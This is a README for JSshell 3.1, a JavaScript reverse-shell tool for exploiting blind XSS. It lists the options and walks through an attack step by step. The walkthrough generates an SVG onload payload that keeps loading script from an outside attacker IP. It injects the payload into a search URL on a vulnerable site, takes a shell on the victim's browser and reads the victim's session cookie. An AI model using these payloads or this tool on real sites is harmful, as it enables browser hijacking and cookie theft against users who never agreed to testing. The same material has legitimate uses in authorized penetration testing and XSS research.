# JSshell - version 3.1

![JSshell](https://user-images.githubusercontent.com/43073671/101387832-ec9f5380-38b6-11eb-9933-db5399cf0319.png)

JSshell - a JavaScript reverse shell. This is used to execute JS code remotely, exploit blind XSS, ...

This tool works for both Unix and Windows operating systems, and it can run on both Python 2 + Python 3. This is 
a big update of JShell - a tool to get a JavaScript shell with XSS by s0med3v. JSshell also doesn't require Netcat (different from JShell).

### New in JSshell version 3.1
Updated in the new version of JShell 3.1:

- New JSshell command: `snippet` -> allows to write a snippet of javascript code

```sh
>>> snippet
Use CTRL+D to finish the snippet

function new() {
    new = 'New update: Support javascript snippet =)';
    confirm(new)
}

new()
>>> 
```
- Quiet mode (for professionals)
- Added `<body>` reverse shell payload
- Fixed some bugs

# Usage
#### Generate JS reverse shell payload:  `-g`
#### Set the local port number for listening and generating payload (By default, it will be set to 4848):  `-p`
#### Set the local source address for generating payload (JSshell will detect your IP address by deault):  `-s`
#### Set timeout for shell connection (if the user exit page, the shell will be pause, and if your set the timeout, after a while without response, the shell will automatically be closed):  `-w`
#### Execute a command after get the shell:  `-c`

#### Example usages:
- `jsh.py`
- `jsh.py -g`
- `jsh.py -p 1234`
- `jsh.py -s 48.586.1.23 -g`
- `jsh.py -c "alert(document.cookie)" -w 10`

#### An example for running JSshell:
This is a step-by-step example for how to use JSshell.

First we will generate a reverse JS shell payload and set the shell timeout is 20 seconds:

```
~# whoami
root
~# ls
README.md   jsh.py
~# python3 jsh.py -g -w 20
    __
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v1.0

Payload:
<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},999)>

Listening on [any] 4848 for incoming JS shell ...
```

Now paste this payload to the website (or URL):

`https://vulnwebs1te.com/b/search?q=<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>`

Access the page and now we will see that we have got the reverse JS shell:

```
    __
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v1.0

Payload:
<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},999)>

Listening on [any] 4848 for incoming JS shell ...
Got JS shell from [75.433.24.128] port 39154 to DESKTOP-1GSL2O2 4848
$ established
$ the
$ shell
$
$
$ help
JSshell using javascript code as shell commands. Also supports some commands:
help                  This help
exit, quit            Exit the JS shell
$
```
Now let's execute some commands:

```
$ var test = 'controlled'
$ alert(test)
$
```
And the browser got an alert:  `controlled`

```
$ prompt(document.cookie)
$
```
And the browser print the user cookies:  `JSESSION=3bda8...`

```
$ exit
~# whoami
root
~# pwd
/home/shelld3v
~#
```

And we quited!


# Author
This is created by [shelld3v](https://github.com/shelld3v)!

